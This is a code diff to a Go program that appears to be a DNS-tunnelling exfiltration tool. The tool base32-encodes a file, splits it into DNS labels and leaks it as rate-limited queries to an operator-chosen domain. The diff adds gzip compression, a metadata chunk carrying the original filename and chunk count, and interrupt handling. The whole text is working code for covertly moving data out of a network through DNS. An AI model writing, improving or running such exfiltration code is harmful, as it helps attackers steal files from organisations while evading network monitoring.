@@ -1,6 +1,8 @@
 package main
 
 import (
+	"bytes"
+	"compress/gzip"
 	"context"
 	"crypto/rand"
 	"encoding/base32"
@@ -12,6 +14,7 @@ import (
 	mathrand "math/rand"
 	"net"
 	"os"
+	"os/signal"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -85,6 +88,8 @@ func main() {
 	domain := flag.String("domain", "", "target domain (required)")
 	file := flag.String("file", "", "file path or '-' for stdin (required)")
 	session := flag.String("session", fmt.Sprintf("%s", randSeqID()), "session id")
+	name := flag.String("name", "", "original filename (optional)")
+	compress := flag.Bool("compress", false, "gzip compress before base32")
 	rate := flag.Int("rate", 60, "queries per minute (cap 600)")
 	labelSize := flag.Int("label", 50, "chars per DNS label (<=63)")
 	retries := flag.Int("retries", 3, "retries per label")
@@ -115,6 +120,18 @@ func main() {
 	data, err := readAll(*file)
 	if err != nil {
 		log.Fatalf("read error: %v", err)
+	}
+
+	if *compress {
+		var b bytes.Buffer
+		gw := gzip.NewWriter(&b)
+		if _, err := gw.Write(data); err != nil {
+			log.Fatalf("gzip write error: %v", err)
+		}
+		if err := gw.Close(); err != nil {
+			log.Fatalf("gzip close error: %v", err)
+		}
+		data = b.Bytes()
 	}
 
 	enc := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
@@ -157,6 +174,8 @@ func main() {
 		if *dry {
 			if *verbose {
 				log.Printf("[dry] %s", name)
+			} else {
+				fmt.Println(name)
 			}
 			return nil
 		}
@@ -166,14 +185,45 @@ func main() {
 		return err
 	}
 
+	// signal handling
 	sigch := make(chan os.Signal, 1)
-	// importless: use os/signal.Notify; inline to avoid extra comment lines
+	signal.Notify(sigch, os.Interrupt)
 	go func() {
 		<-sigch
 		cancel()
 	}()
-	// set up signal notification
 
+	// send meta chunk seq=0: format meta|<total>|<filename_base32>
+	metaLabel := ""
+	if *name != "" {
+		fnB32 := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(*name))
+		fnB32 = toLabel(fnB32)
+		metaLabel = fmt.Sprintf("meta|%d|%s", total, fnB32)
+	} else {
+		metaLabel = fmt.Sprintf("meta|%d|", total)
+	}
+	if len(metaLabel) > 62 {
+		// if meta too long for a single label, truncate filename part
+		parts := strings.SplitN(metaLabel, "|", 3)
+		if len(parts) == 3 {
+			short := parts[2]
+			if len(short) > 40 {
+				short = short[:40]
+			}
+			metaLabel = fmt.Sprintf("meta|%s|%s", parts[1], short)
+		}
+	}
+	metaName := fmt.Sprintf("0.%s.%s.%s", toLabel(metaLabel), *session, *domain)
+	if len(metaName) > 255 {
+		log.Fatalf("meta fqdn too long: %d", len(metaName))
+	}
+	if err := send(ctx, metaName, resolver); err != nil {
+		log.Printf("warning: meta send failed: %v", err)
+	} else if *verbose {
+		log.Printf("sent meta for session %s total=%d", *session, total)
+	}
+
+	// send data chunks (1..N)
 	for i, chunk := range chunks {
 		select {
 		case <-ticker.C:
